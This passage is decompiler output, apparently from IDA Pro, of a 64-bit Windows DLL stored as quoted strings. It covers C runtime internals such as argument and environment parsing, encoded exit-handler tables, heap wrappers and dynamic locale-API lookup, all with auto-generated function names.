    "{",
    "  unsigned int v1; // edi",
    "  unsigned int v3; // ebx",
    "  char *v4; // rsi",
    "  unsigned __int64 v5; // r15",
    "  char **v6; // rax",
    "  XSAVE_FORMAT *v7; // rbx",
    "  XSAVE_FORMAT *v8; // rcx",
    "  unsigned int v9; // esi",
    "  XSAVE_FORMAT *v10; // rdx",
    "  int v11; // ecx",
    "  XSAVE_FORMAT *i; // rax",
    "  XSAVE_FORMAT *lpMem; // [rsp+68h] [rbp+38h] BYREF",
    "  unsigned __int64 v15; // [rsp+70h] [rbp+40h] BYREF",
    "  unsigned __int64 v16; // [rsp+78h] [rbp+48h] BYREF",
    "",
    "  v1 = 0;",
    "  if ( a1 )",
    "  {",
    "    if ( (unsigned int)(a1 - 1) <= 1 )",
    "    {",
    "      sub_18002D78C();",
    "      sub_18002CE70(0, &unk_18004D560, 260);",
    "      v4 = (char *)qword_18004DDF0;",
    "      qword_18004DDD0 = (__int64)&unk_18004D560;",
    "      if ( !qword_18004DDF0 || !*(_BYTE *)qword_18004DDF0 )",
    "        v4 = (char *)&unk_18004D560;",
    "      v15 = 0;",
    "      v16 = 0;",
    "      sub_180022544(v4, 0, 0, &v15, &v16);",
    "      v5 = v15;",
    "      v6 = (char **)sub_18002270C(v15, v16, 1u);",
    "      v7 = (XSAVE_FORMAT *)v6;",
    "      if ( v6 )",
    "      {",
    "        sub_180022544(v4, v6, (char *)&v6[v5], &v15, &v16);",
    "        if ( a1 == 1 )",
    "        {",
    "          *(_QWORD *)&qword_18004DDE0.ControlWord = v7;",
    "          dword_18004DDD8 = v15 - 1;",
    "          v8 = 0;",
    "        }",
    "        else",
    "        {",
    "          lpMem = 0;",
    "          v9 = sub_18002CE68(v7, &lpMem);",
    "          if ( v9 )",
    "          {",
    "            sub_180023374(lpMem);",
    "            lpMem = 0;",
    "            sub_180023374(v7);",
    "            return v9;",
    "          }",
    "          v10 = lpMem;",
    "          v11 = 0;",
    "          for ( i = lpMem; *(_QWORD *)&i->ControlWord; ++v11 )",
    "            i = (XSAVE_FORMAT *)((char *)i + 8);",
    "          dword_18004DDD8 = v11;",
    "          lpMem = 0;",
    "          *(_QWORD *)&qword_18004DDE0.ControlWord = v10;",
    "          sub_180023374(0);",
    "          v8 = v7;",
    "          lpMem = 0;",
    "        }",
    "        sub_180023374(v8);",
    "        return v1;",
    "      }",
    "      v3 = 12;",
    "      *(_DWORD *)sub_18001A80C() = 12;",
    "      sub_180023374(0);",
    "    }",
    "    else",
    "    {",
    "      v3 = 22;",
    "      *(_DWORD *)sub_18001A80C() = 22;",
    "      invalid_parameter_noinfo();",
    "    }",
    "    return v3;",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "__int64 sub_1800228F4()",
    "{",
    "  unsigned int v0; // edi",
    "  __int64 v2; // rax",
    "  XSAVE_FORMAT *v3; // rbx",
    "  __int64 v4; // rax",
    "",
    "  v0 = 0;",
    "  if ( qword_18004D668 )",
    "    return 0;",
    "  sub_18002D78C();",
    "  v2 = sub_18002DB78();",
    "  v3 = (XSAVE_FORMAT *)v2;",
    "  if ( v2 )",
    "  {",
    "    v4 = sub_180022968(v2);",
    "    if ( v4 )",
    "    {",
    "      qword_18004D680 = v4;",
    "      qword_18004D668 = v4;",
    "    }",
    "    else",
    "    {",
    "      v0 = -1;",
    "    }",
    "    sub_180023374(0);",
    "    sub_180023374(v3);",
    "    return v0;",
    "  }",
    "  else",
    "  {",
    "    sub_180023374(0);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180022968(char *a1)",
    "{",
    "  __int64 v2; // rcx",
    "  char *v3; // r8",
    "  char i; // dl",
    "  __int64 v5; // rax",
    "  __int64 v6; // rax",
    "  __int64 v7; // rax",
    "  __int64 v8; // rbx",
    "  __int64 *v10; // r14",
    "  __int64 v11; // rbp",
    "  __int64 v12; // rbp",
    "  __int64 v13; // rax",
    "  __int64 v14; // rdi",
    "",
    "  v2 = 0;",
    "  v3 = a1;",
    "  for ( i = *a1; i; i = *v3 )",
    "  {",
    "    v5 = v2 + 1;",
    "    if ( i == 61 )",
    "      v5 = v2;",
    "    v2 = v5;",
    "    v6 = -1;",
    "    do",
    "      ++v6;",
    "    while ( v3[v6] );",
    "    v3 += v6 + 1;",
    "  }",
    "  v7 = sub_1800232FC(v2 + 1, 8);",
    "  v8 = v7;",
    "  if ( v7 )",
    "  {",
    "    v10 = (__int64 *)v7;",
    "    while ( *a1 )",
    "    {",
    "      v11 = -1;",
    "      do",
    "        ++v11;",
    "      while ( a1[v11] );",
    "      v12 = v11 + 1;",
    "      if ( *a1 != 61 )",
    "      {",
    "        v13 = sub_1800232FC(v12, 1);",
    "        v14 = v13;",
    "        if ( !v13 )",
    "        {",
    "          sub_180022A78(v8);",
    "          sub_180023374(0);",
    "          goto LABEL_9;",
    "        }",
    "        if ( (unsigned int)sub_180023124(v13, v12, a1) )",
    "        {",
    "          sub_18001A6B4();",
    "          JUMPOUT(0x180022A76LL);",
    "        }",
    "        *v10++ = v14;",
    "        sub_180023374(0);",
    "      }",
    "      a1 += v12;",
    "    }",
    "    sub_180023374(0);",
    "    return v8;",
    "  }",
    "  else",
    "  {",
    "LABEL_9:",
    "    sub_180023374(0);",
    "    return 0;",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_180022A78(XSAVE_FORMAT *a1)",
    "{",
    "  XSAVE_FORMAT *v1; // rax",
    "  XSAVE_FORMAT **v3; // rdi",
    "",
    "  if ( a1 )",
    "  {",
    "    v1 = *(XSAVE_FORMAT **)&a1->ControlWord;",
    "    v3 = (XSAVE_FORMAT **)a1;",
    "    while ( v1 )",
    "    {",
    "      sub_180023374(v1);",
    "      v1 = *++v3;",
    "    }",
    "    sub_180023374(a1);",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_180022ABC(XSAVE_FORMAT **a1)",
    "{",
    "  XSAVE_FORMAT *v1; // rcx",
    "",
    "  v1 = *a1;",
    "  if ( v1 != (XSAVE_FORMAT *)qword_18004D680 )",
    "    sub_180022A78(v1);",
    "}",
    "",
    "",
    "void __fastcall sub_180022AD8(XSAVE_FORMAT **a1)",
    "{",
    "  XSAVE_FORMAT *v1; // rcx",
    "",
    "  v1 = *a1;",
    "  if ( v1 != (XSAVE_FORMAT *)qword_18004D678 )",
    "    sub_180022A78(v1);",
    "}",
    "",
    "",
    "void sub_180022AF4()",
    "{",
    "  sub_180022ABC((XSAVE_FORMAT **)&qword_18004D668);",
    "  sub_180022AD8(&qword_18004D670);",
    "  sub_180022A78((XSAVE_FORMAT *)qword_18004D680);",
    "  sub_180022A78((XSAVE_FORMAT *)qword_18004D678);",
    "}",
    "",
    "",
    "// attributes: thunk",
    "__int64 sub_180022B38(void)",
    "{",
    "}__int64 __fastcall sub_180022B40(__int64 a1, int *a2, __int64 a3, int *a4)",
    "{",
    "  sub_1800209E8(*a2);",
    "  LODWORD(a3) = sub_180022BB8(a3);",
    "  sub_180020A3C(*a4);",
    "  return (unsigned int)a3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180022B7C(__int64 a1, int *a2, __int64 a3, int *a4)",
    "{",
    "  sub_1800209E8(*a2);",
    "  LODWORD(a3) = sub_180022D68(a3);",
    "  sub_180020A3C(*a4);",
    "  return (unsigned int)a3;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180022BB8(_QWORD **a1)",
    "{",
    "  _QWORD *v2; // rdx",
    "  uintptr_t v3; // r10",
    "  __int64 v4; // rsi",
    "  uintptr_t *v5; // r9",
    "  char *v6; // rbx",
    "  unsigned __int64 v7; // rbx",
    "  __int64 v8; // rdi",
    "  unsigned __int64 v9; // rdi",
    "  __int64 v10; // r14",
    "  unsigned __int64 v11; // rcx",
    "  __int64 result; // rax",
    "",
    "  v2 = (_QWORD *)**a1;",
    "  if ( v2 )",
    "  {",
    "    v3 = _security_cookie;",
    "    v4 = __ROR8__(*v2 ^ _security_cookie, _security_cookie & 0x3F);",
    "    v5 = (uintptr_t *)__ROR8__(v2[1] ^ _security_cookie, _security_cookie & 0x3F);",
    "    v6 = (char *)__ROR8__(v2[2] ^ _security_cookie, _security_cookie & 0x3F);",
    "    if ( v5 != (uintptr_t *)v6 )",
    "    {",
    "LABEL_14:",
    "      *v5 = v3 ^ __ROR8__(*a1[1], 64 - ((unsigned __int8)v3 & 0x3Fu));",
    "      *(_QWORD *)**a1 = _security_cookie ^ __ROR8__(v4, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));",
    "      *(_QWORD *)(**a1 + 8LL) = _security_cookie ^ __ROR8__(v5 + 1, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));",
    "      result = 0;",
    "      *(_QWORD *)(**a1 + 16LL) = _security_cookie ^ __ROR8__(v6, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));",
    "      return result;",
    "    }",
    "    v7 = (__int64)&v6[-v4] >> 3;",
    "    v8 = v7;",
    "    if ( v7 > 0x200 )",
    "      v8 = 512;",
    "    v9 = v7 + v8;",
    "    if ( !v9 )",
    "      v9 = 32;",
    "    if ( v9 >= v7 && (v10 = sub_18002DC88(v4, v9, 8), sub_180023374(0), v10)",
    "      || (v9 = v7 + 4, v10 = sub_18002DC88(v4, v7 + 4, 8), sub_180023374(0), v10) )",
    "    {",
    "      v3 = _security_cookie;",
    "      v5 = (uintptr_t *)(v10 + 8 * v7);",
    "      v6 = (char *)(v10 + 8 * v9);",
    "      v4 = v10;",
    "      v11 = (unsigned __int64)(v6 - (char *)v5 + 7) >> 3;",
    "      if ( v5 > (uintptr_t *)v6 )",
    "        v11 = 0;",
    "      if ( v11 )",
    "      {",
    "        memset64(v5, _security_cookie, v11);",
    "        v3 = _security_cookie;",
    "      }",
    "      goto LABEL_14;",
    "    }",
    "  }",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180022D68(_QWORD **a1)",
    "{",
    "  _QWORD *v2; // rdx",
    "  uintptr_t v4; // r8",
    "  XSAVE_FORMAT *v5; // rdi",
    "  uintptr_t *v6; // rbx",
    "  uintptr_t v7; // r14",
    "  char v8; // cl",
    "  XSAVE_FORMAT *v9; // r15",
    "  uintptr_t *v10; // rbp",
    "  uintptr_t v11; // rax",
    "  _QWORD *v12; // rdx",
    "  XSAVE_FORMAT *v13; // r9",
    "  uintptr_t *v14; // rax",
    "",
    "  v2 = (_QWORD *)**a1;",
    "  if ( !v2 )",
    "    return 0xFFFFFFFFLL;",
    "  v4 = _security_cookie;",
    "  v5 = (XSAVE_FORMAT *)__ROR8__(*v2 ^ _security_cookie, _security_cookie & 0x3F);",
    "  v6 = (uintptr_t *)__ROR8__(v2[1] ^ _security_cookie, _security_cookie & 0x3F);",
    "  if ( (unsigned __int64)&v5[-1].Reserved4[95] <= 0xFFFFFFFFFFFFFFFDuLL )",
    "  {",
    "    v7 = _security_cookie;",
    "    v8 = _security_cookie & 0x3F;",
    "    v9 = v5;",
    "    v10 = v6;",
    "    while ( --v6 >= (uintptr_t *)v5 )",
    "    {",
    "      v11 = *v6;",
    "      if ( *v6 != v7 )",
    "      {",
    "        *v6 = v7;",
    "        ((void (*)(void))__ROR8__(v4 ^ v11, v8))();",
    "        v4 = _security_cookie;",
    "        v8 = _security_cookie & 0x3F;",
    "        v12 = (_QWORD *)**a1;",
    "        v13 = (XSAVE_FORMAT *)__ROR8__(*v12 ^ _security_cookie, _security_cookie & 0x3F);",
    "        v14 = (uintptr_t *)__ROR8__(v12[1] ^ _security_cookie, _security_cookie & 0x3F);",
    "        if ( v13 != v9 || v14 != v10 )",
    "        {",
    "          v9 = v13;",
    "          v5 = v13;",
    "          v10 = v14;",
    "          v6 = v14;",
    "        }",
    "      }",
    "    }",
    "    if ( v5 != (XSAVE_FORMAT *)-1LL )",
    "    {",
    "      sub_180023374(v5);",
    "      v4 = _security_cookie;",
    "    }",
    "    *(_QWORD *)**a1 = v4;",
    "    *(_QWORD *)(**a1 + 8LL) = v4;",
    "    *(_QWORD *)(**a1 + 16LL) = v4;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180022E88(__int64 a1)",
    "{",
    "  return sub_180022F04(&unk_18004D688, a1);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180022E98(__int64 a1)",
    "{",
    "  _QWORD v2[3]; // [rsp+20h] [rbp-18h] BYREF",
    "  __int64 v3; // [rsp+40h] [rbp+8h] BYREF",
    "  __int64 v4; // [rsp+48h] [rbp+10h] BYREF",
    "  int v5; // [rsp+50h] [rbp+18h] BYREF",
    "  int v6; // [rsp+58h] [rbp+20h] BYREF",
    "",
    "  v3 = a1;",
    "  v2[1] = -2;",
    "  v2[0] = &v3;",
    "  v5 = 2;",
    "  v6 = 2;",
    "  return sub_180022B7C((__int64)&v4, &v6, (__int64)v2, &v5);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180022EDC(uintptr_t *a1)",
    "{",
    "  uintptr_t v2; // rax",
    "",
    "  if ( !a1 )",
    "    return 0xFFFFFFFFLL;",
    "  if ( *a1 == a1[2] )",
    "  {",
    "    v2 = _security_cookie;",
    "    *a1 = _security_cookie;",
    "    a1[1] = v2;",
    "    a1[2] = v2;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180022F04(__int64 a1, __int64 a2)",
    "{",
    "  int v3; // [rsp+20h] [rbp-20h] BYREF",
    "  _QWORD v4[3]; // [rsp+28h] [rbp-18h] BYREF",
    "  __int64 v5; // [rsp+50h] [rbp+10h] BYREF",
    "  __int64 v6; // [rsp+58h] [rbp+18h] BYREF",
    "  char v7; // [rsp+60h] [rbp+20h] BYREF",
    "  int v8; // [rsp+68h] [rbp+28h] BYREF",
    "",
    "  v6 = a2;",
    "  v5 = a1;",
    "  v4[0] = &v5;",
    "  v4[1] = &v6;",
    "  v8 = 2;",
    "  v3 = 2;",
    "  return sub_180022B40((__int64)&v7, &v3, (__int64)v4, &v8);",
    "}",
    "",
    "",
    "char sub_180022F60()",
    "{",
    "  sub_180022EDC(qword_18004D688);",
    "  sub_180022EDC(qword_18004D6A0);",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_180022F84()",
    "{",
    "  sub_180022AF4();",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_180022F94()",
    "{",
    "  uintptr_t v0; // rbx",
    "",
    "  v0 = _security_cookie;",
    "  sub_18001A4F4(_security_cookie);",
    "  sub_180021FE0(v0);",
    "  initp_misc_winsig(v0);",
    "  sub_18002DE44(v0);",
    "  sub_180022518(v0);",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_180022FDC()",
    "{",
    "  if ( _InterlockedExchangeAdd(*(volatile signed __int32 **)&qword_18004DDC0.ControlWord, 0xFFFFFFFF) == 1",
    "    && *(_UNKNOWN **)&qword_18004DDC0.ControlWord != &unk_18004B760 )",
    "  {",
    "    sub_180023374(*(XSAVE_FORMAT **)&qword_18004DDC0.ControlWord);",
    "    *(_QWORD *)&qword_18004DDC0.ControlWord = &unk_18004B760;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_18002301C()",
    "{",
    "  sub_180023374(*(XSAVE_FORMAT **)&qword_18004DC88.ControlWord);",
    "  *(_QWORD *)&qword_18004DC88.ControlWord = 0;",
    "  sub_180023374(*(XSAVE_FORMAT **)&qword_18004DC90.ControlWord);",
    "  *(_QWORD *)&qword_18004DC90.ControlWord = 0;",
    "  sub_180023374(*(XSAVE_FORMAT **)&qword_18004DDE0.ControlWord);",
    "  *(_QWORD *)&qword_18004DDE0.ControlWord = 0;",
    "  sub_180023374(*(XSAVE_FORMAT **)&qword_18004DDE8.ControlWord);",
    "  *(_QWORD *)&qword_18004DDE8.ControlWord = 0;",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 sub_180023078()",
    "{",
    "  return sub_18002DD48(&off_18003D4D0, off_18003D5D0);",
    "}",
    "",
    "",
    "bool __fastcall Concurrency::details::ScheduleGroupSegmentBase::HasUnrealizedChores(#96 *this)",
    "{",
    "  return sub_180026474(this) != 0;",
    "}",
    "",
    "",
    "char sub_1800230A0()",
    "{",
    "  sub_1800262B8();",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_1800230B0(char a1)",
    "{",
    "  if ( !a1 )",
    "    return sub_18002DDDC(&off_18003D4D0, off_18003D5D0);",
    "  if ( *(_QWORD *)&qword_18004D2D8.ControlWord )",
    "    sub_18001F540();",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_1800230E8()",
    "{",
    "  sub_180026638();",
    "  return 1;",
    "}",
    "",
    "",
    "void  sub_1800230F8()",
    "{",
    "  void (*v0)(void); // rax",
    "",
    "  v0 = *(void (**)(void))(sub_1800262FC() + 24);",
    "  if ( v0 )",
    "    v0();",
    "  sub_1800219B0();",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180023124(_BYTE *a1, __int64 a2, __int64 a3)",
    "{",
    "  unsigned int v3; // ebx",
    "  _DWORD *v4; // rax",
    "  _BYTE *v6; // r9",
    "  __int64 v7; // r8",
    "  char v8; // al",
    "",
    "  v3 = 0;",
    "  if ( !a1 || !a2 )",
    "  {",
    "LABEL_5:",
    "    v4 = sub_18001A80C();",
    "    v3 = 22;",
    "LABEL_6:",
    "    *v4 = v3;",
    "    invalid_parameter_noinfo();",
    "    return v3;",
    "  }",
    "  if ( !a3 )",
    "  {",
    "    *a1 = 0;",
    "    goto LABEL_5;",
    "  }",
    "  v6 = a1;",
    "  v7 = a3 - (_QWORD)a1;",
    "  while ( 1 )",
    "  {",
    "    v8 = v6[v7];",
    "    *v6++ = v8;",
    "    if ( !v8 )",
    "      return v3;",
    "    if ( !--a2 )",
    "    {",
    "      *a1 = 0;",
    "      v4 = sub_18001A80C();",
    "      v3 = 34;",
    "      goto LABEL_6;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180023184(__int16 *a1)",
    "{",
    "  unsigned int v1; // edi",
    "  int v2; // ebx",
    "  int v3; // ebx",
    "  __int16 *v5[2]; // [rsp+20h] [rbp-50h] BYREF",
    "  _QWORD v6[2]; // [rsp+30h] [rbp-40h] BYREF",
    "  char v7; // [rsp+40h] [rbp-30h]",
    "  __int128 v8; // [rsp+48h] [rbp-28h]",
    "  char v9; // [rsp+58h] [rbp-18h]",
    "  int v10; // [rsp+5Ch] [rbp-14h]",
    "  char v11; // [rsp+60h] [rbp-10h]",
    "  int v12; // [rsp+64h] [rbp-Ch]",
    "  char v13; // [rsp+68h] [rbp-8h]",
    "",
    "  v6[0] = 0;",
    "  v7 = 0;",
    "  v9 = 0;",
    "  v11 = 0;",
    "  v13 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v9 = 1;",
    "    v8 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v5[1] = 0;",
    "  v5[0] = a1;",
    "  v1 = sub_18001E944((__int64)v6, v5, 0xAu, 1u);",
    "  if ( v9 == 2 )",
    "    *(_DWORD *)(v6[0] + 936LL) &= ~2u;",
    "  if ( v11 )",
    "  {",
    "    v2 = v10;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v6) + 32) = v2;",
    "  }",
    "  if ( v13 )",
    "  {",
    "    v3 = v12;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v6) + 36) = v3;",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800232D0(_WORD *a1, _WORD *a2, __int64 a3)",
    "{",
    "  if ( !a3 )",
    "    return 0;",
    "  while ( --a3 && *a1 && *a1 == *a2 )",
    "  {",
    "    ++a1;",
    "    ++a2;",
    "  }",
    "  return (unsigned __int16)*a1 - (unsigned int)(unsigned __int16)*a2;",
    "}",
    "",
    "",
    "LPVOID __fastcall sub_1800232FC(unsigned __int64 a1, unsigned __int64 a2)",
    "{",
    "  SIZE_T v2; // rbx",
    "  LPVOID result; // rax",
    "",
    "  if ( a1 && 0xFFFFFFFFFFFFFFE0uLL / a1 < a2 )",
    "  {",
    "LABEL_10:",
    "    *(_DWORD *)sub_18001A80C() = 12;",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    v2 = a2 * a1;",
    "    if ( !(a2 * a1) )",
    "      v2 = 1;",
    "    while ( 1 )",
    "    {",
    "      result = HeapAlloc(hHeap, 8u, v2);",
    "      if ( result )",
    "        break;",
    "      if ( !(unsigned int)sub_18002DE88() || !(unsigned int)sub_180021FE8(v2) )",
    "        goto LABEL_10;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_180023374(XSAVE_FORMAT *lpMem)",
    "{",
    "  DWORD LastError; // eax",
    "  int v2; // ebx",
    "",
    "  if ( lpMem )",
    "  {",
    "    if ( !HeapFree(hHeap, 0, lpMem) )",
    "    {",
    "      LastError = GetLastError();",
    "      v2 = sub_18001A738(LastError);",
    "      *(_DWORD *)sub_18001A80C() = v2;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800233E8(__int64 a1, int *a2, _QWORD **a3, int *a4)",
    "{",
    "  sub_1800209E8(*a2);",
    "  qword_18004D868 = _security_cookie ^ __ROR8__(**a3, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));",
    "  LODWORD(a3) = EnumSystemLocalesW((LOCALE_ENUMPROCW)&LocaleEnumProc, 1u);",
    "  qword_18004D868 = _security_cookie;",
    "  sub_180020A3C(*a4);",
    "  return (unsigned int)a3;",
    "}",
    "",
    "",
    "FARPROC __fastcall sub_180023464(unsigned int a1, const CHAR *a2, unsigned int *a3, unsigned int *a4)",
    "{",
    "  __int64 v4; // r15",
    "  unsigned int *v6; // rbp",
    "  uintptr_t v8; // r11",
    "  __int64 v9; // r10",
    "  FARPROC result; // rax",
    "  __int64 v11; // rsi",
    "  HMODULE Library; // rbx",
    "  WCHAR *v13; // r14",
    "",
    "  v4 = a1;",
    "  v6 = a3;",
    "  v8 = _security_cookie;",
    "  v9 = __ROR8__(_security_cookie ^ qword_18004D770[a1], _security_cookie & 0x3F);",
    "  if ( v9 == -1 )",
    "    return 0;",
    "  if ( v9 )",
    "    return (FARPROC)v9;",
    "  if ( a3 == a4 )",
    "  {",
    "LABEL_16:",
    "    _InterlockedExchange64(&qword_18004D770[v4], v8 ^ __ROR8__(-1, 64 - ((unsigned __int8)v8 & 0x3Fu)));",
    "    return 0;",
    "  }",
    "  while ( 1 )",
    "  {",
    "    v11 = *v6;",
    "    Library = (HMODULE)qword_18004D6C0[v11];",
    "    if ( Library )",
    "    {",
    "      if ( Library != (HMODULE)-1LL )",
    "        goto LABEL_20;",
    "      goto LABEL_14;",
    "    }",
    "    v13 = off_18003D5D0[v11];",
    "    Library = LoadLibraryExW(v13, 0, 0x800u);",
    "    if ( Library )",
    "      break;",
    "    if ( GetLastError() == 87 )",
    "    {",
    "      if ( (unsigned int)sub_1800232D0(v13, L\"api-ms-\", 7) )",
    "      {",
    "        if ( (unsigned int)sub_1800232D0(v13, L\"ext-ms-\", 7) )",
    "        {",
    "          Library = LoadLibraryExW(v13, 0, 0);",
    "          if ( Library )",
    "            break;",
    "        }",
    "      }",
    "    }",
    "    _InterlockedExchange64(&qword_18004D6C0[v11], -1);",
    "LABEL_14:",
    "    if ( ++v6 == a4 )",
    "      goto LABEL_15;",
    "  }",
    "  if ( _InterlockedExchange64(&qword_18004D6C0[v11], (__int64)Library) )",
    "    FreeLibrary(Library);",
    "LABEL_20:",
    "  result = GetProcAddress(Library, a2);",
    "  if ( !result )",
    "  {",
    "LABEL_15:",
    "    v8 = _security_cookie;",
    "    goto LABEL_16;",
    "  }",
    "  _InterlockedExchange64(",
    "    &qword_18004D770[v4],",
    "    _security_cookie ^ __ROR8__(result, 64 - ((unsigned __int8)_security_cookie & 0x3Fu)));",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180023620(__int64 a1)",
    "{",
    "  FARPROC v2; // rax",
    "",
    "  v2 = sub_180023464(",
    "         0x19u,",
    "         \"AppPolicyGetProcessTerminationMethod\",",
    "         &dword_18003DC64,",
    "         (unsigned int *)\"AppPolicyGetProcessTerminationMethod\");",
    "  if ( v2 )",
    "    return ((__int64 (__fastcall *)(__int64, __int64))v2)(-6, a1);",
    "  else",
    "    return 3221226021LL;",
    "}",
    "",
    "",
    "__int64 sub_180023678()",
    "{",
    "  __int64 (*v0)(void); // rax",
    "",
    "  v0 = sub_180023464(0, \"AreFileApisANSI\", &dword_18003DB28, &dword_18003DB2C);",
    "  if ( v0 )",
    "    return v0();",
    "  else",
    "    return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800236BC(__int64 a1, unsigned int a2, __int64 a3, __int64 a4)",
    "{",
    "  FARPROC v7; // rax",
    "  _BYTE v9[4]; // [rsp+30h] [rbp-28h] BYREF",
    "  int v10; // [rsp+34h] [rbp-24h] BYREF",
    "  int v11; // [rsp+38h] [rbp-20h] BYREF",
    "  __int64 *v12; // [rsp+40h] [rbp-18h] BYREF",
    "  __int64 v13; // [rsp+60h] [rbp+8h] BYREF",
    "",
    "  v13 = a1;",
    "  v7 = sub_180023464(2u, \"EnumSystemLocalesEx\", (unsigned int *)&unk_18003DB58, (unsigned int *)\"EnumSystemLocalesEx\");",
    "  if ( v7 )",
    "    return ((__int64 (__fastcall *)(__int64, _QWORD, __int64, __int64))v7)(v13, a2, a3, a4);",
    "  v12 = &v13;",
    "  v10 = 4;",
    "  v11 = 4;",
    "  return sub_1800233E8((__int64)v9, &v11, &v12, &v10);",
    "}",
    "",
    "",
    "int __fastcall sub_18002377C(__int64 a1, LCTYPE a2, WCHAR *a3, unsigned int a4)",
    "{",
    "  FARPROC v8; // rax",
    "  LCID v10; // eax",
    "",
    "  v8 = sub_180023464(8u, \"GetLocaleInfoEx\", (unsigned int *)&unk_18003DB90, (unsigned int *)\"GetLocaleInfoEx\");",
    "  if ( v8 )",
    "    return ((__int64 (__fastcall *)(__int64, _QWORD, WCHAR *, _QWORD))v8)(a1, a2, a3, a4);",
    "  v10 = sub_180023ABC(a1, 0);",
    "  return GetLocaleInfoW(v10, a2, a3, a4);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002380C(__int64 a1, unsigned int a2)",
    "{",
    "  FARPROC v4; // rax",
    "  LCID UserDefaultLCID; // eax",
    "",
    "  v4 = sub_180023464(",
    "         0xCu,",
    "         \"GetUserDefaultLocaleName\",",
    "         (unsigned int *)&unk_18003DBC0,",
    "         (unsigned int *)\"GetUserDefaultLocaleName\");",
    "  if ( v4 )",
    "    return ((__int64 (__fastcall *)(__int64, _QWORD))v4)(a1, a2);",
    "  UserDefaultLCID = GetUserDefaultLCID();",
    "  return sub_18002394C(UserDefaultLCID, a1, a2, 0);",
    "}",
    "",
    "",
    "int __fastcall sub_180023878(LPCRITICAL_SECTION lpCriticalSection, PCONTEXT dwSpinCount, unsigned int a3)",
    "{",
    "  DWORD v4; // ebx",
    "  FARPROC v6; // rax",
    "",
    "  v4 = (unsigned int)dwSpinCount;",
    "  v6 = sub_180023464(0xFu, \"InitializeCriticalSectionEx\", (unsigned int *)\"\\a\", (unsigned int *)&unk_18003DBF0);",
    "  if ( v6 )",
    "    return ((__int64 (__fastcall *)(LPCRITICAL_SECTION, _QWORD, _QWORD))v6)(lpCriticalSection, v4, a3);",
    "  else",
    "    return InitializeCriticalSectionAndSpinCount(lpCriticalSection, v4);",
    "}",
    "",
    "",
    "int __fastcall sub_1800238E8(__int64 a1)",
    "{",
    "  FARPROC v2; // rax",
    "  LCID v4; // eax",
    "",
    "  v2 = sub_180023464(0x10u, \"IsValidLocaleName\", (unsigned int *)&unk_18003DBF0, (unsigned int *)\"IsValidLocaleName\");",
    "  if ( v2 )",
    "    return ((__int64 (__fastcall *)(__int64))v2)(a1);",
    "  v4 = sub_180023ABC(a1, 0);",
    "  return IsValidLocale(v4, 1u);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002394C(unsigned int a1, __int64 a2, unsigned int a3, unsigned int a4)",
    "{",
    "  FARPROC v8; // rax",
    "",
    "  v8 = sub_180023464(0x12u, \"LCIDToLocaleName\", (unsigned int *)&unk_18003DC28, (unsigned int *)\"LCIDToLocaleName\");",
    "  if ( v8 )",
    "    return ((__int64 (__fastcall *)(_QWORD, __int64, _QWORD, _QWORD))v8)(a1, a2, a3, a4);",
    "  else",
    "    return sub_18002DE90(a1, a2, a3);",
    "}",
    "",
    "",
    "int __fastcall sub_1800239D0(",
    "        __int64 a1,",
    "        DWORD a2,",
    "        const WCHAR *a3,",
    "        unsigned int a4,",
    "        WCHAR *lpDestStr,",
    "        int cchDest,",
    "        __int64 a7,",
    "        __int64 a8,",
    "        __int64 a9)",
    "{",
    "  FARPROC v13; // rax",
    "  LCID v15; // eax",
    "",
    "  v13 = sub_180023464(0x11u, \"LCMapStringEx\", (unsigned int *)&unk_18003DC10, (unsigned int *)\"LCMapStringEx\");",
    "  if ( v13 )",
    "    return ((__int64 (__fastcall *)(__int64, _QWORD, const WCHAR *, _QWORD, WCHAR *, int, __int64, __int64, __int64))v13)(",
    "             a1,",
    "             a2,",
    "             a3,",
    "             a4,",
    "             lpDestStr,",
    "             cchDest,",
    "             a7,",
    "             a8,",
    "             a9);",
    "  v15 = sub_180023ABC(a1, 0);",
    "  return LCMapStringW(v15, a2, a3, a4, lpDestStr, cchDest);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180023ABC(__int64 a1, unsigned int a2)",
    "{",
    "  FARPROC v4; // rax",
    "",
    "  v4 = sub_180023464(0x13u, \"LocaleNameToLCID\", (unsigned int *)&unk_18003DC48, (unsigned int *)\"LocaleNameToLCID\");",
    "  if ( v4 )",
